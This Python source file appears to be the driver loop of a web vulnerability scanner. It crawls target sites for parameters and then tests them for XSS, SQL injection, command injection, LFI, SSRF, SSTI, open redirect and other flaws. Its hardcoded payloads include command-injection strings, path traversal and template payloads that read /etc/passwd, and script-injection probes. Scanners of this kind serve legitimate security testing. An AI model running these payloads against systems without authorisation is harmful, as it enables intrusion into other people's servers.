from parametizer.params import parametizer,parametizer2, parametizer3
from scanners.scan_crlf import crlf    
from scanners.scan_xss import xss,xss_forms, xss_params
from scanners.scan_lfi import lfi, lfi_params
from scanners.scan_sqli import sqli, sqli_params
from scanners.scan_xxe import xxe
from scanners.scan_clickjacking import clickjacking
from scanners.scan_cors import cors
from parametizer.core.save_it import save_output
import sys,os ,requests
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
import random
from scanners.scan_idor import idor
from scanners.scan_rce import rce, rce_params
from scanners.scan_redirect import redirect, redirect_params
from scanners.scan_lfi import lfi, lfi_params
from scanners.scan_ssrf import ssrf, ssrf_params
from scanners.scan_ssti import ssti, ssti_params

def all_list(l,c,cl,cr,x,xe,lf,s,i,r,rc,sr,sst,output,output2,fname,o,vulnerables_urls,op,params,threads,word_list):   
 indice=0
 
 while indice < len(l):
     
     linea=l[indice]
     menssaje= f" | Scanning {indice + 1} of {len(l)} |"    
     print()
     print('-'*len(linea) + '-'* len(menssaje)+ '--')
     print("| "+"\033[1;36m" + linea + '\033[0;m'+ menssaje )
     print('-'*len(linea) + '-'* len(menssaje) + '--')
     print()
     try:
          
         uri=[]
         uri2=[]
         uri.append(linea)
         uri2.append(linea)
         print('\033[1;33mSearch endpoints and parameters:\n\033[0m')
         parametizer(linea,output,threads)
         try:
             with open(output, "r") as f:
                 for q in f.readlines():
                     q = q.strip()
                     if q == "" or q.startswith("#"):
                         pass
                     uri.append(q)
         except:
             pass
         parametizer3(linea,output2,threads)
         try:
             with open(output2, "r") as ff:
                 for qq in ff.readlines():
                     qq = qq.strip()
                     if qq == "" or qq.startswith("#"):
                         pass
                     uri2.append(qq)                                                                                                                               
         except:
                 pass
         print(f"\033[1;32m[+] Total urls found : {(len(uri)-1)+len(uri2)}\033[1;31m")

         if cl:    
             clickjacking(uri2,vulnerables_urls,threads)
         if c:           
             cors(uri2,vulnerables_urls,threads)
         if x:
             if len(word_list) == 0:
                 wordlist=['"><script>confirm(1)</script>','<h1>NELUXMATIZER</h1>']
             else:
                 wordlist=word_list
             if op:
                     xss_params(uri,params,threads)
             else:                                             
                     print()        
                     print('\033[1;33mTest xss for default payload:\033[0m')       
                     xss(uri,wordlist,vulnerables_urls,threads)
                     xss_forms(uri2,wordlist,vulnerables_urls)                              
         if xe:
              print()
              print('\033[1;33mTest xxe for default payload:\033[0m')       
              xxe(uri2,vulnerables_urls,threads)              

         if s:
             if len(word_list) == 0:
                 wordlist=["%27"]
             else:
                 wordlist=word_list                        
             if op:
                     sqli_params(uri2,params,threads)
             else:                                     
                     print()        
                     print('\033[1;33mTest sqli for default payload:\033[0m')
                     print()        
                     sqli(uri,wordlist,vulnerables_urls,threads)           

         if i and op:
             wordlist=['']   
             print()        
             print('\033[1;33mSearch idor parameters:\033[0m')
             print()        
             idor(uri,params,threads)           
    
         if rc:
             wordlist=['| ipconfig /all','; ipconfig /all','& ipconfig /all','| ifconfig',
             '& ifconfig', '; ifeconfig','&& ifconfig','system("cat /etc/passwd");','system("cat /etc/passwd");'
             ]
             if op:
                     rce_params(uri,params,threads)
             else:                                             
                     print()        
                     print('\033[1;33mTest rce for default payload:\033[0m')       
                     rce(uri,wordlist,vulnerables_urls,threads)  

         if r: 
             wordlist=['////google.com/','https:///google.com/','/https:google.com','<>javascript:alert(1);','http:///////////google.com','javascript:alert(1)']
             if op:
                         redirect_params(uri,params,threads)
             else:                                           
                         print()        
                         print('\033[1;33mTest redirect for default payload:\033[0m')       
                         redirect(uri,wordlist,vulnerables_urls,threads)           
             
         if sr:
             wordlist=[r'file:///etc/passwd',r'file://\/\/etc/passwd']   
             if op:
                     ssrf_params(uri,params,threads)
             else:                                     
                     print()        
                     print('\033[1;33mTest SSRF for default payloads:\033[0m')
                     print()        
                     ssrf(uri,wordlist,vulnerables_urls,threads)           
             
         if lf:
             if len(word_list) == 0:
                 wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd']
             else:
                 wordlist=word_list                                
             if op:
                     lfi_params(uri,params,threads)
             else:
                     print()        
                     print('\033[1;33mTest lfi for default payload:\033[0m')
                     print()        
                     lfi(uri,wordlist,vulnerables_urls,threads)           
             
         if sst:
             wordlist=["<%= File.open('/etc/passwd').read %>","${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"]   
             if op:
                     ssti_params(uri,params,threads)
             else:
                     print()        
                     print('\033[1;33mTest ssti for default payloads:\033[0m')
                     print()        
                     ssti(uri,wordlist,vulnerables_urls,threads)           
         try:
             if cr:
                 print()
                 print('\033[1;33mTest crlf for default payload:\033[0m')       
                 crlf(uri2,vulnerables_urls,threads)    
         except:
              indice+=1
              continue                
     except:
         print()
         print("\033[1;36m"+" CLOSE PROGRAM " + '\033[0;m')
         indice=len(l)+1
         pass     
                 
     if o:
         save_output(vulnerables_urls,fname,linea)
         if "/" in fname:        
               print(f"\u001b[32m[+] Output is saved here :\u001b[31m \u001b[36m{fname}\u001b[31m" )
         else:
               print(f"\u001b[32m[+] Output is saved here :\u001b[31m \u001b[36moutput/{fname}\u001b[31m" )
     if op:
         save_output(params,fname,linea)
         if "/" in fname:        
               print(f"\u001b[32m[+] Output is saved here :\u001b[31m \u001b[36m{fname}\u001b[31m" )
         else:
               print(f"\u001b[32m[+] Output is saved here :\u001b[31m \u001b[36moutput/{fname}\u001b[31m" )
    
     indice+= 1
     




